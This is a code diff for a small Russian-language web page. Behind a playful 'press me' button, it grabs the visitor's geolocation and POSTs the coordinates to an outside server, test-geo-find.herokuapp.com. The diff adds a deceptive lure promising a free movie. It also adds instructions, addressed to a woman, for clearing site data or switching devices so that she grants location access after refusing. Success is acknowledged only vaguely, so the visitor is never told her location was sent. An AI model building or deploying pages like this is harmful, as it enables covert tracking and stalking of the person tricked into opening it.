@@ -10,14 +10,52 @@
 </head>
 <body>
 
-<div class="button">НАЖМИ НА МЕНЯ :)</div>
+<div class="content">
+    <div class="content__message-error _hidden">
+        <p class="content__p">
+            К сожалению, ты запретила доступ к геоданным и волшебник на голубом
+            вертолете не сможет показать бесплатное кино (^人^)
+        </p>
+        <p class="content__p">
+            Чтобы исправить этот кузус, нужно:
+        </p>
+        <ul class="content__ul">
+            <li>
+                Перейди в настройки
+            </li>
+            <li>
+                зайти в очистить историю
+            </li>
+            <li>
+                выбрать настройки контента
+            </li>
+            <li>
+                удалить данные
+            </li>
+            <li>
+                перезегрузить страницу
+            </li>
+        </ul>
+        <p class="content__p">
+            Или открой с другого устройства или с другого браузера и не забыть нажать кнопку разрешить :)
+        </p>
+    </div>
+    <div class="content__message-success _hidden">Будем надеяться, что на этой планете произошло что-то хорошее (^人^) </div>
+    <div class="content__button">НАЖМИ НА МЕНЯ</div>
+</div>
 
 <script>
-    let button = document.getElementsByClassName('button')[0];
+    let button = document.getElementsByClassName('content__button')[0];
+    let errorBlock = document.getElementsByClassName('content__message-error')[0];
+    let successBlock = document.getElementsByClassName('content__message-success')[0];
 
     button.addEventListener('click', () => {
-        navigator.geolocation.getCurrentPosition(position => {
 
+        button.classList.remove('_hidden');
+        errorBlock.classList.add('_hidden');
+        successBlock.classList.add('_hidden');
+
+        navigator.geolocation.getCurrentPosition(position => {
             let latitude = position.coords.latitude;
             let longitude = position.coords.longitude;
 
@@ -31,7 +69,15 @@
                 body: JSON.stringify({latitude, longitude})
             };
 
-            fetch('https://test-geo-find.herokuapp.com', fetchOptions)
+            fetch('https://test-geo-find.herokuapp.com', fetchOptions).then(() => {
+                button.classList.add('_hidden');
+                errorBlock.classList.add('_hidden');
+                successBlock.classList.remove('_hidden');
+            })
+        }, error => {
+            button.classList.add('_hidden');
+            successBlock.classList.add('_hidden');
+            errorBlock.classList.remove('_hidden');
         });
     });
 </script>
